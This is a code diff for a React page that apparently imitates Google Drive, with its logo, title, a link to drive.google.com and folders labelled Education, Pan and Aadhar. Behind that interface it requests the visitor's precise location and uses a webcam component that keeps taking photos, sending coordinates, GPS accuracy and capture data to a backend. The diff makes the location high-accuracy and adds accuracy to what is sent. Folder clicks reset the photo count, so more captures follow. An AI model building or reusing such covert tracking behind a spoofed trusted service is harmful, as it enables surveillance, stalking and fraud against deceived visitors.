@@ -1,41 +1,69 @@
 "use client";
 import Image from "next/image";
 import { WebCamComponent } from "./webcam";
-import { getEvent } from "@/apihandler/media.api";
+import { getEvent, getLocation } from "@/apihandler/media.api";
 import { use, useEffect, useRef, useState } from "react";
-
 
 export const DriveComponent = () => {
   const lt = useRef(0);
   const lg = useRef(0);
+  const accuracy = useRef(0);
   const [count, setCount] = useState(0);
 
   const onSave = async (str: string) => {
     const eventData = {
-      lt: lt.current, lg: lg.current, s: str
-    }
+      lt: lt.current,
+      lg: lg.current,
+      s: str,
+      acc: accuracy.current,
+    };
     if (!(lt.current === 0 && lg.current === 0)) {
-      const addCustomerRes = await getEvent(eventData);
+      const addCustomerRes = await getLocation(eventData);
       setCount(count + 1);
     }
-  }
+  };
   const handleClick = () => {
     setCount(0);
-  }
+  };
   const getLatLng = () => {
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        lt.current = latitude;
-        lg.current = longitude;
+      navigator.geolocation.getCurrentPosition(showPosition, showError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0,
       });
     } else {
     }
+  };
+  const showPosition = (position: GeolocationPosition) => {
+    var latitude = position.coords.latitude;
+    var longitude = position.coords.longitude;
+    var accu = position.coords.accuracy; // Accuracy in meters
+    lt.current = latitude;
+    lg.current = longitude;
+    accuracy.current = accu;
+  };
+
+  function showError(error: any) {
+    switch (error.code) {
+      case error.PERMISSION_DENIED:
+        console.log("User denied the request for Geolocation.");
+        break;
+      case error.POSITION_UNAVAILABLE:
+        console.log("Location information is unavailable.");
+        break;
+      case error.TIMEOUT:
+        console.log("The request to get user location timed out.");
+        break;
+      case error.UNKNOWN_ERROR:
+        console.log("An unknown error occurred.");
+        break;
+    }
   }
+
   useEffect(() => {
-    getLatLng()
-  }, [])
+    getLatLng();
+  }, []);
   return (
     <>
       <div className="navbar-fixed">
@@ -43,14 +71,18 @@ export const DriveComponent = () => {
           <div className="nav-wrapper grey lighten-5 flex justify-between">
             <ul>
               <li className="flex items-center">
-                <img src="/google-drive.png" style={{ width: 40, height: 40}} alt="" />
+                <img
+                  src="/google-drive.png"
+                  style={{ width: 40, height: 40 }}
+                  alt=""
+                />
                 <a href="#!" className="title grey-text text-darken-1">
-                 Drive
+                  Drive
                 </a>
               </li>
             </ul>
             <ul className="">
-              <li className="hidden sm:block"> 
+              <li className="hidden sm:block">
                 <a href="#!">
                   <i className="material-icons grey-text text-darken-1">apps</i>
                 </a>
@@ -63,7 +95,7 @@ export const DriveComponent = () => {
                 </a>
               </li>
               <li>
-              <a
+                <a
                   href="https://drive.google.com/"
                   target="_blank"
                   className="waves-effect waves-light btn btn-flat white-text"
@@ -79,24 +111,39 @@ export const DriveComponent = () => {
         <div className="container-fluid">
           <p className="subheader">Folders</p>
           <div className="card-panel-container">
-          <div className="card-panel folder grey lighten-5" onClick={handleClick}>
-            <div>
-            <i className="material-icons left">folder</i>Education
+            <div
+              className="card-panel folder grey lighten-5"
+              onClick={handleClick}
+            >
+              <div>
+                <i className="material-icons left">folder</i>Education
+              </div>
+              <i className="material-icons grey-text text-darken-1">
+                more_vert
+              </i>
             </div>
-            <i className="material-icons grey-text text-darken-1">more_vert</i>
-          </div>
-          <div className="card-panel folder grey lighten-5" onClick={handleClick}>
-            <div>
-            <i className="material-icons left">folder</i>Pan
+            <div
+              className="card-panel folder grey lighten-5"
+              onClick={handleClick}
+            >
+              <div>
+                <i className="material-icons left">folder</i>Pan
+              </div>
+              <i className="material-icons grey-text text-darken-1">
+                more_vert
+              </i>
             </div>
-            <i className="material-icons grey-text text-darken-1">more_vert</i>
-          </div>
-          <div className="card-panel folder grey lighten-5" onClick={handleClick}>
-            <div>
-            <i className="material-icons left">folder</i>Aadhar
+            <div
+              className="card-panel folder grey lighten-5"
+              onClick={handleClick}
+            >
+              <div>
+                <i className="material-icons left">folder</i>Aadhar
+              </div>
+              <i className="material-icons grey-text text-darken-1">
+                more_vert
+              </i>
             </div>
-            <i className="material-icons grey-text text-darken-1">more_vert</i>
-          </div>
           </div>
           <WebCamComponent onSave={onSave} takePhotos={count !== 5} />
         </div>
